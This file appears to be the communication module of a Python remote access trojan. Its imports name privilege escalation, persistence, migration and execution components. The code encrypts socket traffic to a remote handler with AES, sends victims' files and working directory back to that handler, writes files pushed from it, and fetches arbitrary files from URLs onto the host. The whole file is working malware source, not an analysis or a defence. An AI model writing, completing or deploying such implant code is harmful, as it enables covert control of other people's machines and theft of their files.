from defines import *
import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex
# Functions that facilitate communication between shell and handler, and file transfer.
 
aesobj = AES.new(AES_KEY, AES.MODE_CFB, AES_IV)
 
EncodeAES = lambda s: base64.b64encode(aesobj.encrypt(s))
DecodeAES = lambda e: aesobj.decrypt(base64.b64decode(e))
 
def send(data): #Send data and current directory
    sock.sendall(EncodeAES(str(data)+"\n"+os.getcwd()+">"+marker))
     
def status(data): #Used to send data without waiting for server to respond
    sock.sendall(EncodeAES(chr(2)+chr(2)+data+marker))
     
def receive():
    return DecodeAES(sock.recv(4096))
     
def download(file): #Function to download files
    file = os.path.join(os.getcwd(),file) #Get full file path
    try:
        with open(file,"rb") as f:
            print(file) #Print file name for debugging purposes.
            while True:
                line = f.readline()
                if not line: break #Read and send file line by line.
                sock.sendall(line)
            print("sending marker")
            time.sleep(1) #When done, send marker.
            sock.send(marker)
            print("bb") #bye bye
            f.close()
            sock.settimeout(None) #Reset socket timeout
            return
    except Exception as e: #In case of exception, print it and return.
        sock.send("Error during download: "+str(e))
        sock.send(marker)
             
def upload(file):
    with open(file,"wb") as f:
        #Set timeout so in case of errors the script doesn't freeze.
        sock.settimeout(10)
        while True:
            line = sock.recv(4096)
            if marker in line: break #Upload might be glitchy, use downhttp instead
            f.write(line) #Write to file
            f.flush()
        print("\nDownload complete")
        f.close() #Download complete! We can close the file and return.
        sock.settimeout(None)
        return
     
def download_HTTP(link): #Download a file from a URL.
    filename = link.split("/").pop() #Get file name
    try:
        urllib.urlretrieve(link, filename)
    except Exception as e:
        return("Download failed: "+str(e))
    return("Done")
    